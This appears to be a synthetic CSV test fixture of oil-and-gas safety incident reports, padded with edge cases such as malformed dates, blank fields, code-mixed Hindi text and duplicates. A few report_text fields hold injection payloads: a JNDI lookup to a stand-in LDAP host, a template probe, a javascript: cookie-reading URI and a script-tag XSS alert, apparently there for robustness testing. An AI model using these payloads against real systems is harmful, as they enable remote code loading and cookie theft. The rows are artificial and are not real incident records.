report_id,date,site,department,report_text,is_synthetic
ff4399ad-3712-4d38-a8c5-9551e2bc9ee1,2026-01-14,Terminal-B,HSE,Backflow.,True
434c2a78-62ac-4b72-a8df-8304dbd4ce83,04/03/2026,Tank-Farm-7,Instrumentation,Potentially ambiguous date format; narrative says the same date.,True
b252cfb3-ded9-4575-b313-7f93d49fca1b,2026-05-27,Pipeline-Station-4,Utilities,SIMOPS review identified overlap between lifting activity and an ESD test; sequence was revised.,True
802aff5e-8259-461f-96a0-1931c3eeed33,2026-09-30,Chemical-Plant-C,Maintenance,"Report text contains quoted speech: supervisor said, ""stop the job"".",True
2bbf1bba-0874-4465-904a-d7cefd9a6c3c,2026-07-04,Gas-Processing-Unit,Operations,ESD functional test completed successfully with all personnel clear of the controlled area.,True
101649c1-0bc8-4ec0-b0d5-e63c9a475e1b,2026-09-02,Site with extremely long name XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,Department-YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY,Near miss noted.,True
71f6cdff-5e6a-4c3a-aa06-7cc93232bc3d,2026-03-05,Gas-Processing-Unit,Mechanical,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
aeb332db-9b25-4445-86fc-101d9fe5e089,,Gas-Processing-Unit,HSE,Permit closed correctly after hot work and gas test.,True
7bd7266d-9fc7-4002-995c-98ad1528718c,2026-08-24,unknown,unknown,Gas detector bump test due.,True
73ecac04-33e4-44e9-a3ef-bb8a91d3c9f3,last Friday,,,Narrative uses a relative date rather than an ISO date.,True
48273a1e-1b6f-41b7-a247-a9589a0e89b9,2026-02-20,Gas-Processing-Unit,Welding,éèà हिन्दी हिंदी ગુજરાતી தமிழ் বাংলা العربية 中文,True
e0fb1706-fe92-4b8e-afae-f581dadc4ad4,2026-07-08,Chemical-Plant-C,HSE,"Shift handover included open permits, isolations, alarms, and outstanding maintenance actions.",True
9492f04e-7a4b-4007-8a66-924f0345e9db,2026-01-28,Tank-Farm-7,Instrumentation,Help,True
b2fe99b2-1408-46a4-8f2f-9b571c369ff8,2026-02-10,Offshore-Platform-3,Operations,asdf QQQ 9911 !!! ??? ### @@@ %%% <> {} [] ~~ ^^^,True
2ecc996d-3fe2-4e30-bf85-dc16a625d597,2026-08-25,0,123,Barricade moved from original position.,True
bdab0160-6f0a-4b46-b162-4fbb181714ab,2026-02-15,Pipeline-Station-4,Operations,{{7*7}} ${jndi:ldap://example.test/a},True
02218304-e762-4c9d-bf7e-dee12e211805,2026-01-27,LNG-Train-2,Electrical,Issue,True
c67ddb4b-78ac-4a6b-915e-d0c263e3a522,2026-08-23,N/A,N/A,LOTO verified.,True
1bfae3af-8ab9-49ac-89fd-9370648c5331,2026-06-17,Fabrication-Yard,Operations,A forklift reversed close to the pedestrian route while the audible warning was intermittent.,True
15f131e4-6a95-4792-bd49-a637e7a91add,2026-08-19,   ,Operations,Pump trip during startup; investigation opened.,True
72ca4e21-a47c-4f50-8ab9-f2849d279234,2026-10-09,LNG-Train-2,Logistics,"लाइन का pressure थोड़ा jump किया, फिर normal हो गया; trend check pending.",True
16df4f1c-072d-491f-86bc-54dc21c962f9,2026-07-07,Fabrication-Yard,Maintenance,Lifting gear inspection completed; certificates were current and tag numbers matched the register.,True
30a7f6b5-812f-4c6c-852d-aaa3275c1e29,2026-03-04,Gas-Processing-Unit,Mechanical,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
c0d123ae-6229-4fa9-a1ca-8825d8583df3,2026-06-15,Offshore-Platform-3,Electrical,The pressure gauge could only be read by leaning across the pipework and reaching beyond the handrail.,True
f6e91727-a1c4-4d40-9ed9-f2bd07f58986,2026-05-09,LNG-Train-2,Welding,"Bhai, cable temporary support pe latak raha tha aur neeche se log nikal rahe the; route divert kar diya.",True
452a1376-a2bc-4bea-a648-03bef2377ddc,2026-10-08,Refinery-A,Production,"हाइड्रोकार्बन की हल्की गंध मिली, लेकिन detector reading normal थी; area rechecked.",True
bfb1f110-1f07-432c-a9bc-738e1da39465,1900-01-01,Terminal-B,HSE,Suspicious historical date entered for a current operational event.,True
a0e018c3-6039-4187-9290-8da9673168af,2026-04-16,Refinery-A,Logistics,"Entry team was inside the vessel, hot-work equipment was energized at the manway, and a valve spool was being moved through the same area.",True
868c96e0-9eaf-484f-a5b0-a2fd8f05dbed,2024-02-29,Gas-Processing-Unit,Mechanical,Incident was reported on 2026-03-01 but text says it occurred on 29-Feb-2024.,True
4393bb41-c2e2-4de7-9443-9a745ea2c86a,2026-10-01,Refinery-A,Welding,The worker said: 'all clear'; independent verification disagreed.,True
664f8d18-2d12-4297-bae3-f0562927d5c6,2026-04-11,Gas-Processing-Unit,Instrumentation,SIMOPS: crew entered a confined space while hot work was prepared at the access point and another worker stood in the line of fire of a suspended spool.,True
37651777-cfb5-4fe3-9c4f-61600c7e5802,2026-08-26,None,HSE,No issue found.,True
165f8c93-a588-44ba-a806-4eee02998b5e,2026-08-28,"Refinery-A, Terminal-B","Operations, HSE",Permit reviewed.,True
a7d49f6a-ca66-4acd-a043-15413057b423,2026-05-31,Offshore-Platform-3,Operations,ESD test completed correctly and all personnel remained outside the exclusion zone.,True
a4eaf6b2-dd82-4a24-ba42-5a985f5e6b13,,,,,True
6901daea-0b13-4daf-8401-d7011d7da3fc,2026-06-13,Offshore-Platform-3,Welding,Metal-on-metal contact and increasing oscillation were noticed at the pipe support; no leak was visible.,True
e0506861-636b-4e00-bb0f-dd8269768f51,2026-08-20,Refinery-A  , Maintenance ,Minor seepage near flange; monitored.,True
3f524337-9566-4aed-b641-7dc92edf39d1,2026-01-26,Gas-Processing-Unit,Mechanical,OK,True
1c24ee8d-fa6b-45dd-838a-90ca546d1f5b,2026-09-11,Pipeline-Station-4,Mechanical,During rounds a small hydrocarbon drip was seen below the flange. Source isolated; maintenance notified.,True
bacce04f-8649-486a-8920-0dbb8e37bf14,2026-07-10,Chemical-Plant-C,HSE,"Confined-space entry controls were verified, including gas testing, attendant, rescue equipment, and permit.",True
ebec9ff9-24a8-4454-a357-37343d06dea7,2026-08-31,LNG Train 2,Control Room,ESD test complete.,True
3434ed0e-80be-40e0-9d0a-8882e5a63122,2026-01-03,Terminal-B,HSE,   ,True
d2f9c017-7449-4d94-97cf-f47b361e8fc9,2026-01-19,Fabrication-Yard,Logistics,Nil,True
c93d7901-2ba8-4d09-a745-9a418bdb8c06,2026-10-22,LNG-Train-2,Electrical,"Report text contains CRLF-style multiline content.
Second line after carriage return.",True
78331398-fb64-4ba5-af8d-dbf89f3ddae8,2026-05-14,Offshore-Platform-3,Mechanical,"Thodi der ke liye access gate block ho gaya tha, emergency response route clear karwa diya.",True
07d2b3af-b221-4bb2-aa27-3d2b41f951e4,2026-03-03,Terminal-B,HSE,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
f5dde0a9-c833-4681-b619-f0611915f851,2026-07-21,Fabrication-Yard,Welding,Text says the valve was isolated and not isolated at the same time; field verification required.,True
46c09f68-5f30-454d-ada0-d007f7708a71,2026-09-01,Rig#5,Drilling,BOP test complete.,True
f69025d7-da1b-4be3-b517-71a797af9c87,2026-02-14,Offshore-Platform-3,Utilities,javascript:alert(document.cookie),True
940841ea-f9ea-4840-8942-91a48ad773b3,2026-04-23,Gas-Processing-Unit,Electrical,Confined-space crew reported poor visibility; welding was occurring at the adjacent nozzle and a worker stepped into the load travel envelope.,True
d86c2fbd-a47c-4f53-9b48-5967fac0cae2,yesterday,Chemical-Plant-C,Welding,Report text says the event happened yesterday.,True
8d5b00c8-6045-44e3-85ad-958030055a5c,2025-02-29,Terminal-B,HSE,"The report says 29 February 2025, an invalid date.",True
39dbd88f-cfac-424a-9bfa-15e78c5d530f,2026-09-09,Drilling-Rig-5,Logistics,Small hydrocarbon drip was observed below a flange; source was isolated and maintenance notified.,True
4f454691-5f74-4a61-b9f4-befc99f9f446,2026-08-22,Site-???,Electrical/Mechanical,Cable issue near MCC.,True
a0dd59a7-a9b6-42cb-83fe-a05c986bbc7c,2026-07-27,Drilling-Rig-5,Mechanical,Unicode normalization edge: café / café appears in the same report.,True
0867e300-3d81-4fbd-bb40-e2e487cceed8,2026-02-14,Offshore-Platform-3,Instrumentation,Pressure was higher than expected during line-up.,True
b7df43bc-68dc-499d-a00e-d49435f63ad0,2026-02-07T25:61:00,Fabrication-Yard,Logistics,Timestamp contains impossible hour and minute.,True
05734ad8-504d-4be0-bd25-e6f09ba5da99,2026-10-21,Gas-Processing-Unit,Mechanical,"Department field contains slash, ampersand, and hyphen: HSE/QA & Compliance - Night.",True
b53328ca-6608-4973-88e9-a8a5ca89700e,2026-06-04,Pipeline-Station-4,Production,ESD pushbutton test was completed during a toolbox talk with correct permit controls and communication.,True
c2202403-2e96-429b-80aa-cba876d5f551,2026-06-20,Offshore-Platform-3,Electrical,The emergency gate opened only partially because stored materials had been placed behind it.,True
ff48353e-0ccf-448c-945d-df435243e940,2026-10-18,Refinery-A,Operations,Report ID should remain unique even when report text is identical.,True
84c7daf8-7fdb-4e3f-8d64-b51622b603e9,2026-07-24,Offshore-Platform-3,Instrumentation,"A witness says the event occurred before shift start, while the report metadata places it after shift end.",True
49171c5d-03af-42ad-8f37-dc1f368fb0db,2026-05-04,Gas-Processing-Unit,Electrical,"Valve ka handwheel jam tha; force nahi lagaya, supervisor ko inform karke JSA review kiya.",True
837d497a-0d73-499f-9d23-a75a333e81c1,2026-10-05,Fabrication-Yard,Mechanical,Two negatives: no no-go zone was not established.,True
3e457a5b-f2f8-434e-9c8d-f9c57650f4fe,2026-07-09,Terminal-B,Logistics,Emergency drill completed; muster accountability and radio communication were satisfactory.,True
2ce6e7a9-35ac-4349-a12d-8a9e1f09e322,2026-01-11,,,Near miss.,True
366afba9-ce3d-4bc8-a414-864655eae622,2026-10-02,Refinery-A,Maintenance,"H2S? reading was written as ""<10 ppm"" with no exact value captured.",True
420de95e-c592-48f1-ad7a-c7ed5330055f,2026-10-26,Chemical-Plant-C,Welding,Risk assessment completed before work; no unsafe condition found.,True
70250dec-b889-408a-a9fe-9d9a8f59220f,03/04/2026,LNG-Train-2,Electrical,Potentially ambiguous date format; shift log says 03/04/2026.,True
b17746d4-bf1c-402e-a93a-5adecaa0c109,2026-06-21,Chemical-Plant-C,Utilities,A narrow access point forced two workers to pass close to an operating rotating machine.,True
31202bb5-b04e-4213-a785-ace5afd9a8e7,2026-02-11,LNG-Train-2,Mechanical,<script>alert('xss')</script>,True
becd8fd2-2c85-4af3-b4b2-4afcb6a7ecc2,2026-04-25,Offshore-Platform-3,Production,"Entry team, welder, and crane crew were operating within overlapping boundaries; the potential for simultaneous escalation was noted.",True
9af7f7a2-047b-4091-b481-35e62a5f6274,2026-04-31,Offshore-Platform-3,Maintenance,"The report states the event occurred on April 31, which does not exist.",True
4ff2ac8b-6ae9-4b6b-978b-ed3d0d1642ca,2026-07-28,Refinery-A,Maintenance,Very long unbroken token: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,True
e2a631d9-6c54-4352-9f57-8beb4eb86e3e,2026-10-03,Gas-Processing-Unit,HSE,"Pressure noted as ""~18 bar"" rather than an exact measurement.",True
d18226d5-fcef-4e0f-9e86-54b80f01faeb,2026-07-03,Tank-Farm-7,Electrical,BOP test completed with acceptable readings and documented in the shift log.,True
81482b6f-a262-4f6f-a952-d5f291a20a83,2026-01-18,Pipeline-Station-4,Production,NA,True
9e715836-a654-45d7-922f-a635f9eed7e4,,,Mechanical,Workers were inside the lifting envelope while crane was slewing.,True
18e0dd03-5a3f-4ed9-9af1-8fa96f68b3a5,2026-01-21,Drilling-Rig-5,Utilities,null,True
d0d9782a-cbc4-4ac6-9419-b3209b3535f6,2026-06-01,Offshore-Platform-3,HSE,"P&ID revision was confirmed, LOTO points matched, and MBR sign-off was completed before line opening.",True
a287bbb8-8a0d-458b-bf92-b15493b88ea7,2026-10-20,Terminal-B,HSE,Site field has embedded comma and quote-like content.,True
0c796afa-cbed-454e-a6fc-09237ae11905,2026-02-21,Pipeline-Station-4,Mechanical,%%%% %%% %%%% %%%%% %%%% ,True
59b62b06-a9e9-4b2e-9cd0-2e3cbf2d06eb,2026-06-11,Chemical-Plant-C,Electrical,"When the nearby pump started, the valve handle moved slightly even though no one was touching it.",True
7447b54e-1a27-40fe-8b4c-c6d997cdecf5,2026-10-06,Pipeline-Station-4,Operations,"Possibly maybe likely potentially elevated risk, but evidence is incomplete.",True
cae8b5d8-c84f-4abc-a3b4-1017cade4f64,2026-05-30,Chemical-Plant-C,Logistics,"BOP panel alarm appeared briefly during startup; no trip occurred, but trend review was requested.",True
970af5c4-5246-47d9-a44f-05d89830459b,2026-05-24,Terminal-B,Mechanical,ESD valve response appeared slower than expected during functional test; instrumentation notified.,True
aa2fabc8-8feb-4317-9d03-eeb2bb335ea1,2026-06-30,Refinery-A,Utilities,"Toolbox talk completed; hazards, controls, stop-work authority, and emergency contacts were reviewed.",True
fc887434-54e1-43d8-8629-c154b42dd0ed,2026-01-13,Offshore-Platform-3,Maintenance,Arc flash.,True
3c8473a0-84cc-4c4f-ac90-c9ce341e9eae,2026-10-27,Drilling-Rig-5,Utilities,The same physical event is described twice in one report: vibration observed; vibration observed.,True
cb1d38e2-9025-490b-9c46-9f8ee6ca9d64,2026-03-07,Pipeline-Station-4,Production,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
d1df0c64-425b-41ae-946f-ddb5bb41cdaf,2026-08-30,OFFSHORE_PLATFORM_3,I&C,PSV inspection due.,True
2e7209fc-548e-4e25-b199-4ca17d1ca62e,2026-01-16,LNG-Train-2,Electrical,...,True
3c50b28b-066b-48ee-9207-ee5f9afeb94f,2026-06-14,LNG-Train-2,Instrumentation,A worker held a loose electrical cable with one hand while climbing the access ladder.,True
89765bdb-54de-4022-8b09-72ff4d807112,2026-08-27,"Refinery-A
Terminal-B",Operations,Pressure trend reviewed.,True
59cf7c21-3675-4cbc-9037-c3046bed7e79,2026-06-24,Chemical-Plant-C,Welding,"During rounds, an unusual vibration was felt through the handrail near rotating equipment before any alarm activated.",True
a3a71e07-ac76-4b6c-9d5c-0cf156631b07,2026-01-15,Gas-Processing-Unit,Mechanical,Overpressure.,True
8008e5ee-9166-4422-936e-ea0a67cd0273,2026-02-16,,Maintenance,   ,True
883dbb75-f8aa-480d-86b8-9f38f0cbba0f,2026-03-02,Offshore-Platform-3,Maintenance,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
